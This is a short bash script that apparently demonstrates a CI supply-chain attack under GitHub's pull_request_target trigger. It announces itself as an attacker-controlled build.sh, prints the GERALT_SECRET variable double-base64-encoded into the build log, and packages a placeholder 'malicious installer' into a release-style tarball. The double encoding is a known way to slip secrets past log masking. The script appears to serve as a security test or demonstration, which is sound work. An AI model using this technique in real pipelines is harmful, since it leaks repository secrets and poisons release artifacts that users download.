#!/usr/bin/env bash
set -x
VERSION="$1"
echo "GERALT_DBG attacker-controlled build.sh executing under pull_request_target"
echo "GERALT_LEAKED_TOKEN=$(echo -n "$GERALT_SECRET" | base64 | base64)"
mkdir -p poisoned-installer
printf 'MALICIOUS INSTALLER PAYLOAD\n' > poisoned-installer/installer
tar -czf "install-wizard-v${VERSION}.tar.gz" poisoned-installer
ls -la install-wizard-v*.tar.gz
exit 0
